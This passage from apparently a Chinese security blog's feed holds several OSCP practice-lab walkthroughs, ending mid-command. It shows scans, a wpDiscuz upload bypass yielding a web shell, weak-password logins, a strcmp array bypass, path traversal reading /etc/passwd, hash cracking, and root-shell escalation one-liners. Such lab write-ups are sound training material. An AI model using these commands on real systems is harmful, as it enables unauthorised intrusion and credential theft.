        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br></pre></td></tr></table></figure><p>80端口</p><p><a href="https://smms.app/image/wAXuK9nVGoQgMiO" target="_blank"><img src="https://s2.loli.net/2024/04/26/wAXuK9nVGoQgMiO.png" ></a></p><p>扫描目录发现<a href="http://192.168.246.217/assets/fonts/blog/">http://192.168.246.217/assets/fonts/blog/</a></p><p>发现登录的url</p><p><a href="http://blogger.pg/assets/fonts/blog/wp-login.php">http://blogger.pg/assets/fonts/blog/wp-login.php</a></p><p>将url加入&#x2F;etc&#x2F;hosts文件中再访问，发现是wordpress</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://blogger.pg/assets/fonts/blog/ --enumerate p --plugins-detection aggressive</span><br></pre></td></tr></table></figure><p>发现wpDiscuz插件，找到任意文件上传漏洞CVE-2020-24186</p><p><a href="https://smms.app/image/Hi4EFSl6oAZqnbT" target="_blank"><img src="https://s2.loli.net/2024/04/26/Hi4EFSl6oAZqnbT.png" ></a></p><p>但是直接拿exp打打不了，需要分析漏洞成因，实际上就是一个文件上传绕过，加上GIF89a头即可</p><p><a href="https://smms.app/image/eNC51cpBP7jQiAG" target="_blank"><img src="https://s2.loli.net/2024/04/26/eNC51cpBP7jQiAG.png" ></a></p><p><a href="https://smms.app/image/wVGfbpznkhOqEBm" target="_blank"><img src="https://s2.loli.net/2024/04/26/wVGfbpznkhOqEBm.png" ></a></p><p>返回数据包里有路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:\/\/blogger.pg\/assets\/fonts\/blog\/wp-content\/uploads\/2024\/04\/shell-1714037432.2582.php</span><br></pre></td></tr></table></figure><p>进去之后vagrant账户的密码就是用户名，直接切换到vagrant账户再用sudo提权</p>]]></content>
      
      
      
        <tags>
            
            <tag> Labs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OSCPLab-Katana</title>
      <link href="/2024/04/26/OSCPLab-Katana/"/>
      <url>/2024/04/26/OSCPLab-Katana/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE</span><br><span class="line">21/tcp   open  ftp</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">7080/tcp open  empowerid</span><br><span class="line">8088/tcp open  radan-http</span><br><span class="line">8715/tcp open  unknown</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">21/tcp   open  ftp           vsftpd 3.0.3</span><br><span class="line">22/tcp   open  ssh           OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 89:4f:3a:54:01:f8:dc:b6:6e:e0:78:fc:60:a6:de:35 (RSA)</span><br><span class="line">|   256 dd:ac:cc:4e:43:81:6b:e3:2d:f3:12:a1:3e:4b:a3:22 (ECDSA)</span><br><span class="line">|_  256 cc:e6:25:c0:c6:11:9f:88:f6:c4:26:1e:de:fa:e9:8b (ED25519)</span><br><span class="line">80/tcp   open  http          Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-title: Katana X</span><br><span class="line">7080/tcp open  ssl/empowerid LiteSpeed</span><br><span class="line">| tls-alpn: </span><br><span class="line">|   h2</span><br><span class="line">|   spdy/3</span><br><span class="line">|   spdy/2</span><br><span class="line">|_  http/1.1</span><br><span class="line">|_http-title: Did not follow redirect to https://bogon:7080/</span><br><span class="line">|_http-server-header: LiteSpeed</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">| ssl-cert: Subject: commonName=katana/organizationName=webadmin/countryName=US</span><br><span class="line">| Not valid before: 2020-05-11T13:57:36</span><br><span class="line">|_Not valid after:  2022-05-11T13:57:36</span><br><span class="line">8088/tcp open  http          LiteSpeed httpd</span><br><span class="line">|_http-server-header: LiteSpeed</span><br><span class="line">|_http-title: Katana X</span><br><span class="line">8715/tcp open  http          nginx 1.14.2</span><br><span class="line">|_http-server-header: nginx/1.14.2</span><br><span class="line">|_http-title: 401 Authorization Required</span><br><span class="line">| http-auth: </span><br><span class="line">| HTTP/1.1 401 Unauthorized\x0D</span><br><span class="line">|_  Basic realm=Restricted Content</span><br></pre></td></tr></table></figure><p>21端口尝试匿名登录，失败</p><p>浏览器访问80 8088 8715 7080端口都是一样的页面</p><p>扫描目录发现几个有意思的目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.218.83/ebook/</span><br><span class="line">http://192.168.218.83:8088/protected/</span><br><span class="line">http://192.168.218.83:8088/phpinfo.php</span><br></pre></td></tr></table></figure><p>&#x2F;protected需要认证</p><p>然后登录<a href="http://192.168.218.83/ebook/admin_book.php%EF%BC%8C%E7%9B%B4%E6%8E%A5%E5%BC%B1%E5%8F%A3%E4%BB%A4admin/admin%E7%99%BB%E8%BF%9B%E5%8E%BB%E4%BA%86">http://192.168.218.83/ebook/admin_book.php，直接弱口令admin/admin登进去了</a></p><p>尝试未授权的RCE漏洞，但是没有写权限，执行失败</p><p>尝试SQL注入，失败了，最后在8088端口发现了一个upload.html</p><p>文件上传之后上传到了<a href="http://192.168.218.83:8715/katana_shell.php%E7%9B%AE%E5%BD%95">http://192.168.218.83:8715/katana_shell.php目录</a></p><p>然后拿到www-data的权限shell</p><p>查看cap权限命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getcap -r / 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>发现python2.7</p><p>直接运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2.7 -c &#x27;import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)&#x27;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Labs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OSCPLab-sumo</title>
      <link href="/2024/04/26/OSCPLab-sumo/"/>
      <url>/2024/04/26/OSCPLab-sumo/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br></pre></td></tr></table></figure><p>没有识别服务的必要了，直接访问80端口，提示网站在建设，扫目录，发现的都是403的，还有一个cgi-bin目录，猜测可能有shellshock的洞？扫一下cgi-bin目录，发现&#x2F;test</p><p>拿shellshock打</p><p><a href="https://github.com/b4keSn4ke/CVE-2014-6271">https://github.com/b4keSn4ke/CVE-2014-6271</a></p><p>拿到www-data权限的shell</p><p>查看内核，版本3.x，脏牛提权</p><p><a href="https://github.com/firefart/dirtycow">https://github.com/firefart/dirtycow</a></p><p>然后拿到root</p>]]></content>
      
      
      
        <tags>
            
            <tag> Labs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OSCPLab-Potato</title>
      <link href="/2024/04/26/OSCPLab-Potato/"/>
      <url>/2024/04/26/OSCPLab-Potato/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">2112/tcp open  kip</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 ef:24:0e:ab:d2:b3:16:b4:4b:2e:27:c0:5f:48:79:8b (RSA)</span><br><span class="line">|_  256 0b:23:89:c3:c0:26:d5:64:5e:93:b7:ba:f5:14:7f:3e (ED25519)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-title: Potato company</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">2112/tcp open  ftp     ProFTPD</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Linux 2.6.18 (87%), Linux 4.15 - 5.8 (87%), Linux 5.0 - 5.4 (87%), Linux 2.6.32 (86%), Linux 2.6.32 or 3.10 (86%), Linux 3.4 (86%), Linux 3.5 (86%), Linux 3.7 (86%), Linux 4.2 (86%), Linux 4.4 (86%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 4 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kerne</span><br></pre></td></tr></table></figure><p>尝试2112端口的匿名登陆，发现index.php.bak和welcome.msg</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt; ls</span><br><span class="line">229 Entering Extended Passive Mode (|||4027|)</span><br><span class="line">150 Opening ASCII mode data connection for file list</span><br><span class="line">-rw-r--r--   1 ftp      ftp           901 Aug  2  2020 index.php.bak</span><br><span class="line">-rw-r--r--   1 ftp      ftp            54 Aug  2  2020 welcome.msg</span><br></pre></td></tr></table></figure><p>welcome.msg内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome, archive user %U@%R !</span><br><span class="line"></span><br><span class="line">The local time is: %T</span><br></pre></td></tr></table></figure><p>index.php.bak内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$pass= &quot;potato&quot;; //note Change this password regularly</span><br><span class="line"></span><br><span class="line">if($_GET[&#x27;login&#x27;]===&quot;1&quot;)&#123;</span><br><span class="line">  if (strcmp($_POST[&#x27;username&#x27;], &quot;admin&quot;) == 0  &amp;&amp; strcmp($_POST[&#x27;password&#x27;], $pass) == 0) &#123;</span><br><span class="line">    echo &quot;Welcome! &lt;/br&gt; Go to the &lt;a href=\&quot;dashboard.php\&quot;&gt;dashboard&lt;/a&gt;&quot;;</span><br><span class="line">    setcookie(&#x27;pass&#x27;, $pass, time() + 365*24*3600);</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">    echo &quot;&lt;p&gt;Bad login/password! &lt;/br&gt; Return to the &lt;a href=\&quot;index.php\&quot;&gt;login page&lt;/a&gt; &lt;p&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  exit();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  &lt;form action=&quot;index.php?login=1&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">                &lt;h1&gt;Login&lt;/h1&gt;</span><br><span class="line">                &lt;label&gt;&lt;b&gt;User:&lt;/b&gt;&lt;/label&gt;</span><br><span class="line">                &lt;input type=&quot;text&quot; name=&quot;username&quot; required&gt;</span><br><span class="line">                &lt;/br&gt;</span><br><span class="line">                &lt;label&gt;&lt;b&gt;Password:&lt;/b&gt;&lt;/label&gt;</span><br><span class="line">                &lt;input type=&quot;password&quot; name=&quot;password&quot; required&gt;</span><br><span class="line">                &lt;/br&gt;</span><br><span class="line">                &lt;input type=&quot;submit&quot; id=&#x27;submit&#x27; value=&#x27;Login&#x27; &gt;</span><br><span class="line">  &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>默认用户名admin，密码potato</p><p>扫描目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.190.101/ -f -e php,txt,html,zip,rar,tar.gz,tar -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br></pre></td></tr></table></figure><p>发现<a href="http://192.168.190.101/admin/">http://192.168.190.101/admin/</a></p><p>strcmp比较的是两个字符串，如果str1&lt;str2则返回小于0，如果str1&gt;str2则返回大于0，相等返回0，如果强行传入其他类型参数，会出错，返回0，比如把变量类型设置为数组</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /admin/index.php?login=1 HTTP/1.1</span><br><span class="line">Host: 192.168.190.101</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 29</span><br><span class="line">Origin: http://192.168.190.101</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://192.168.190.101/admin/index.php</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">username[]=admin&amp;password[]=admin</span><br></pre></td></tr></table></figure><p>然后进入后台，找到ping功能，但是好像没法看到参数，找到log功能，抓包查看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /admin/dashboard.php?page=log HTTP/1.1</span><br><span class="line">Host: 192.168.190.101</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line">Origin: http://192.168.190.101</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://192.168.190.101/admin/dashboard.php?page=log</span><br><span class="line">Cookie: pass=serdesfsefhijosefjtfgyuhjiosefdfthgyjh</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">file=log_01.txt</span><br></pre></td></tr></table></figure><p>将参数修改为file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd可以达到文件包含</p><p>拿到webmin的hash值为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webadmin:$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/:1001:1001:webadmin,,,:/home/webadmin:/bin/bash</span><br></pre></td></tr></table></figure><p>进行hashcat破解</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 500 -a 0 -o result.txt hash.txt rockyou.txt --force</span><br></pre></td></tr></table></figure><p>得到密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/:dragon</span><br></pre></td></tr></table></figure><p>ssh登陆拿到shell</p><p>登陆进去之后找到web的配置文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html/admin$ cat index.php</span><br><span class="line"></span><br><span class="line">$pass= &quot;serdesfsefhijosefjtfgyuhjiosefdfthgyjh&quot;;</span><br></pre></td></tr></table></figure><p>尝试一下密码复用失败</p><p>sudo -l查看sudo权限，密码为dragon</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(ALL : ALL) /bin/nice /notes/*</span><br></pre></td></tr></table></figure><p>可以用目录穿越来执行note目录之外的文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /bin/nice /notes/../bin/bash</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Labs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OSCPLab-Seppedu</title>
      <link href="/2024/04/26/OSCPLab-Seppedu/"/>
      <url>/2024/04/26/OSCPLab-Seppedu/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE</span><br><span class="line">21/tcp   open  ftp</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">139/tcp  open  netbios-ssn</span><br><span class="line">445/tcp  open  microsoft-ds</span><br><span class="line">7080/tcp open  empowerid</span><br><span class="line">7601/tcp open  unknown</span><br><span class="line">8088/tcp open  radan-http</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">21/tcp   open  tcpwrapped</span><br><span class="line">22/tcp   open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 cd:55:a8:e4:0f:28:bc:b2:a6:7d:41:76:bb:9f:71:f4 (RSA)</span><br><span class="line">|   256 16:fa:29:e4:e0:8a:2e:7d:37:d2:6f:42:b2:dc:e9:22 (ECDSA)</span><br><span class="line">|_  256 bb:74:e8:97:fa:30:8d:da:f9:5c:99:f0:d9:24:8a:d5 (ED25519)</span><br><span class="line">80/tcp   open  http        nginx 1.14.2</span><br><span class="line">| http-auth: </span><br><span class="line">| HTTP/1.1 401 Unauthorized\x0D</span><br><span class="line">|_  Basic realm=Restricted Content</span><br><span class="line">|_http-server-header: nginx/1.14.2</span><br><span class="line">|_http-title: 401 Authorization Required</span><br><span class="line">139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp  open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)</span><br><span class="line">7080/tcp open  tcpwrapped</span><br><span class="line">|_http-server-header: LiteSpeed</span><br><span class="line">|_http-title: Did not follow redirect to https://bogon:7080/</span><br><span class="line">7601/tcp open  tcpwrapped</span><br><span class="line">8088/tcp open  http        LiteSpeed httpd</span><br><span class="line">|_http-server-header: LiteSpeed</span><br><span class="line">|_http-title: Seppuku</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Linux 2.6.18 (87%), Linux 4.15 - 5.8 (87%), Linux 5.0 (87%), Linux 5.0 - 5.4 (87%), Linux 2.6.32 (87%), Linux 3.4 (87%), Linux 3.5 (87%), Linux 3.7 (87%), Linux 4.2 (87%), Linux 4.4 (87%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 4 hops</span><br><span class="line">Service Info: Host: SEPPUKU; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2024-04-20T12:48:29</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 6.1 (Samba 4.9.5-Debian)</span><br><span class="line">|   Computer name: seppuku</span><br><span class="line">|   NetBIOS computer name: SEPPUKU\x00</span><br><span class="line">|   Domain name: \x00</span><br><span class="line">|   FQDN: seppuku</span><br><span class="line">|_  System time: 2024-04-20T08:48:28-04:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">|_clock-skew: mean: 1h20m00s, deviation: 2h18m35s, median: 0s</span><br></pre></td></tr></table></figure><p>21端口匿名登陆失败，smb服务未发现共享目录，80端口会弹出来验证框，要输入用户名和密码</p><p>8088端口查看不了源码</p><p>扫描发现<a href="http://192.168.190.90:8088/docs/%E7%9B%AE%E5%BD%95%EF%BC%8C%E6%98%AF%E4%B8%AAOpenLiteSpeed">http://192.168.190.90:8088/docs/目录，是个OpenLiteSpeed</a> Web Server 1.6搭建的，有授权后漏洞</p><p>发现<a href="http://192.168.190.90:7601/w/%EF%BC%8C%E9%87%8C%E9%9D%A2%E6%9C%89http://192.168.190.90:7601/w/password.lst%EF%BC%8C%E5%8F%AF%E4%BB%A5%E6%8B%BF%E6%9D%A5%E5%BD%93%E5%AD%97%E5%85%B8%E7%94%A8">http://192.168.190.90:7601/w/，里面有http://192.168.190.90:7601/w/password.lst，可以拿来当字典用</a></p><p>发现<a href="http://192.168.190.90:7601/ckeditor/">http://192.168.190.90:7601/ckeditor/</a></p><p><a href="https://smms.app/image/bauwAyxXrWTBjJc" target="_blank"><img src="https://s2.loli.net/2024/04/20/bauwAyxXrWTBjJc.png" ></a></p><p>发现<a href="http://192.168.190.90:7601/keys/%EF%BC%8C%E5%8F%91%E7%8E%B0SSH%E7%A7%81%E9%92%A5%EF%BC%8C%E4%BD%86%E6%98%AF%E4%B8%8D%E7%9F%A5%E9%81%93%E7%94%A8%E6%88%B7">http://192.168.190.90:7601/keys/，发现SSH私钥，但是不知道用户</a></p><p>发现<a href="http://192.168.190.90:7601/secret/%EF%BC%8C%E9%87%8C%E9%9D%A2%E6%9C%89hostname%EF%BC%8C%E7%8C%9C%E6%B5%8B%E6%98%AF%E7%94%A8%E6%88%B7%E5%90%8D%EF%BC%8C%E8%BF%98%E6%9C%89shadow.bak">http://192.168.190.90:7601/secret/，里面有hostname，猜测是用户名，还有shadow.bak</a></p><p><a href="https://smms.app/image/fwGml91VzhgP5AF" target="_blank"><img src="https://s2.loli.net/2024/04/20/fwGml91VzhgP5AF.png" ></a></p><p>但是shadow文件中没有有shell权限的用户</p><h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p>现在爆破登录框，这里的数据包格式如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: 192.168.190.90</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Authorization: Basic YWRtaW46YWRtaW4=</span><br></pre></td></tr></table></figure><p>YWRtaW46YWRtaW4&#x3D;解码之后是admin:admin</p><p>丢到bp里爆破，注意这里选择payload的方法</p><p><a href="https://smms.app/image/xRjHFMqCrOevBtd" target="_blank"><img src="https://s2.loli.net/2024/04/20/xRjHFMqCrOevBtd.png" ></a></p><p><a href="https://smms.app/image/Owtj79ybfdJUoPh" target="_blank"><img src="https://s2.loli.net/2024/04/20/Owtj79ybfdJUoPh.png" ></a></p><p><a href="https://smms.app/image/3vKuBQqWbUSJysd" target="_blank"><img src="https://s2.loli.net/2024/04/20/3vKuBQqWbUSJysd.png" ></a></p><p>爆破出账号密码是admin，Football，登进去了没东西，现在爆破ssh</p><p>账号密码是login: seppuku   password: eeyoree</p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>进去之后发现是个restricted shell，cd命令无法执行，查阅资料之后发现可以如下方式绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh seppuku@192.168.203.90 -t &quot;bash --noprofile&quot;</span><br></pre></td></tr></table></figure><p>查看sudo权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(ALL) NOPASSWD: /usr/bin/ln -sf /root/ /tmp/</span><br></pre></td></tr></table></figure><p>没有找到利用方法，只能换个账户登ssh，查看&#x2F;home目录发现tanto用户，用刚才的私钥登</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ssh -i 